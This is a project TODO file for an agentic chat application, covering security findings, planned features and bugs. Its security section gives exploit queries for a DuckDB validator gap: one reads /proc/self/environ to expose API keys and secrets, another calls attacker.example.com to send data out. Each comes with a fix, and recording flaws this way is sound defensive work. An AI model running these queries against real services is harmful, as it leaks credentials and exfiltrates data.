# TODO

## General

- Consider using a centralized logging solution like ELK or Datadog or loki with Grafana for better observability.

## Security

- **[CRITICAL] rag_service — Arbitrary local file read via DuckDB read functions.** `_validate_read_only_sql` in [rag_service/main.py:34-55](rag_service/main.py#L34-L55) is a blacklist (`insert|update|delete|drop|create|alter|truncate|copy|attach|detach|pragma|vacuum|call|execute`) plus a `SELECT|WITH` first-token rule. DuckDB table-valued read functions (`read_csv_auto`, `read_csv`, `read_text`, `read_blob`, `read_json_auto`, `read_parquet`, `parquet_scan`, `glob`) are unlisted and callable inside a valid `SELECT`. The `\b<table>\b` substring check is satisfied with a string literal. The DuckDB connection in [rag_service/core/duck_db.py:12](rag_service/core/duck_db.py#L12) opens with no engine-level restrictions. Exploit: `SELECT content FROM read_text('/proc/self/environ') AS t(content) WHERE 'sales' IS NOT NULL` returns the container env including `OPENAI_API_KEY`, `TRUSTED_PROXY_SECRET`, `SESSION_TOKEN_SECRET` — full lateral movement across all services. Fix: open the connection with `config={"enable_external_access": "false", "allow_unsigned_extensions": "false"}` and replace the regex blacklist with an AST whitelist (e.g. `sqlglot`) that only permits `SELECT`/`WITH` against registered in-memory tables. Remove the `\b<table>\b` check — it is not a security control.
- **[HIGH] rag_service — SSRF and outbound exfiltration via DuckDB `httpfs` autoload.** Same validator gap: DuckDB's read functions accept HTTP(S)/S3 URLs and auto-load `httpfs` on demand inside a `SELECT`. Exploit: `SELECT * FROM read_csv_auto('http://attacker.example.com/?leak=' || (SELECT count(*) FROM sales))` issues outbound HTTP from the container — can hit cloud metadata (`169.254.169.254`) or probe internal services. Fix: `enable_external_access=false` closes both this and the local-file vector. Add egress firewalling on `rag_service` as a second layer.
- **[MEDIUM] MCP gateway — `/var/run/docker.sock` mounted RW.** [docker-compose-denis-mcp.yaml:19](docker-compose-denis-mcp.yaml#L19) (and the local equivalent) mount the docker socket read-write into the third-party `docker/mcp-gateway:latest` container. Inherent to the MCP-gateway design (it spawns server containers), but a compromise of the gateway image equals root on Dennis. If MCP is not required in production, don't deploy that overlay; otherwise treat the gateway as a tier-0 trust boundary.
- **[VERIFY ON DENNIS] nginx real-IP CIDR.** [agentic_ui/nginx.conf.template](agentic_ui/nginx.conf.template) now uses `set_real_ip_from 172.16.0.0/12` + `real_ip_header CF-Connecting-IP` so per-user auth rate limiting works (otherwise every login from every user shares NPM's single container IP and the auth limiter becomes one global bucket). Before going live, SSH to Dennis and run `docker network inspect proxy` to confirm the actual subnet of the proxy network falls inside `172.16.0.0/12`; if NPM's stack uses a custom subnet outside that range, narrow `set_real_ip_from` to the exact CIDR. Also verify NPM forwards `CF-Connecting-IP` end-to-end (Cloudflare sets it; NPM should pass it through). If NPM strips it, switch the directive to `real_ip_header X-Forwarded-For;`.
- **[LOW] agents — `is_trusted_proxy_request` config fragility.** [agents/core/proxy.py:50-55](agents/core/proxy.py#L50-L55) silently falls back to CIDR-only trust when `TRUSTED_PROXY_SECRET` is empty. Current defaults are safe (both empty → deny all), but an operator who sets `TRUSTED_PROXY_CIDRS` while forgetting the secret would turn auth into "any IP in CIDR is trusted." Fix: add a boot-time assert — if `app.env == "production"` and `trusted_proxy_secret` is empty, fail to start.
- Secure the agents from prompt injection by implementing input filtering / guardrails before requests reach the agents.

## New Features

- Projects / Workspaces: group related conversations, files, agents, tools, preferences, and instructions into persistent workspaces for long-running work.
- Deep Research mode: run longer multi-step research workflows with source citations, confidence notes, step traces, and exportable reports.
- Scheduled Tasks: let users create one-off or recurring agent jobs that run later, complete while the user is offline, and notify them with results.
- Artifacts / Canvas: add an editable side workspace for generated reports, markdown docs, code, tables, diagrams, JSON configs, and other reusable outputs.
- Agent run timeline: make planning, retrieval, tool calls, verification, and final-answer steps visible as a polished timeline for each agent run. Use this for the approval of a [HITL Event](https://ai-sdk.dev/elements/components/confirmation) or create a custom one. This can be used for the agentic chat stream feel as [actions](https://elements.ai-sdk.dev/components/task) or [this one](https://elements.ai-sdk.dev/components/tool). Also cause we are detached from the ui in the runtime we need to modify the planning card to be per conversation that is actively streaming and not in general.

## Agents

- Update the retrieval process and the whole RAG pipelines so that it will be like an mcp tool calling.
- Add end-to-end file (no image) attachment support in inference, including deep-agent passthrough and LangGraph input normalization/parsing for file parts.

## Dialogue Bridge

- Add the pgvector in order to have an embedding for each conversation and then we can use this embedding to find the most relevant conversations for a given query, this will be useful for the retrieval process and memory across chats.
- The inference needs to be transferred into Redis in order to be better. This will allow us to have a better performance and also we can have a better way to handle the streaming of the messages and the interactions with the UI without having to worry about a thousand calls to the database.

## Agentic UI

- Use [shadcn/ui](https://www.shadcn.io/components) for a more polished and consistent design across the app. This will also help with accessibility and responsiveness.
- Chart can be visualized with [shadcn/charts](https://www.shadcn.io/charts) and the agent can have a custom tool like the todo tool in order to represent the chart and create a custom AGUI event for the interaction with the chart.
- I think the best way to implement an agentic UI is to have all the agui event for every message (raw event list) and then upon read a past message to have a parser that will parse the raw event list and create the final UI for that message, this way we can have a more flexible and powerful way to create the UI for each message and also we can have a better control over the state of the UI and the interactions with it. This will also allow us to have a better way to handle the streaming of the messages and the interactions with the UI without having to worry about the state of the UI at any given time. Also the chain of thought if we can change the icon is the perfect task drop down

## Bugs

- When changing to voice mode the transition in bad in the input bar actually the transition. Also if l change the voice mode and go to a conversation before connection and been live l will see and error and when it will connect l will be redirected to the voice mode even though l have left from there and l am in another conversation, we need to fix this issue and make sure that the voice mode is only active when the user is in the voice mode and if leave it will stop.
- The mermaid diagrams, code blocks are not rendering according to the browser size, we need to make it responsive. This problem is more extensive and l mean that the user messages as well are not showing if the width of the browser is too small, we need to make the whole chat body responsive and adapt to different screen sizes or appear a horizontal scrollbar.
- In the hr policies agent in the detached inference l got a "stream observer lost" error and the agent stopped working, we need to investigate this issue and fix it.
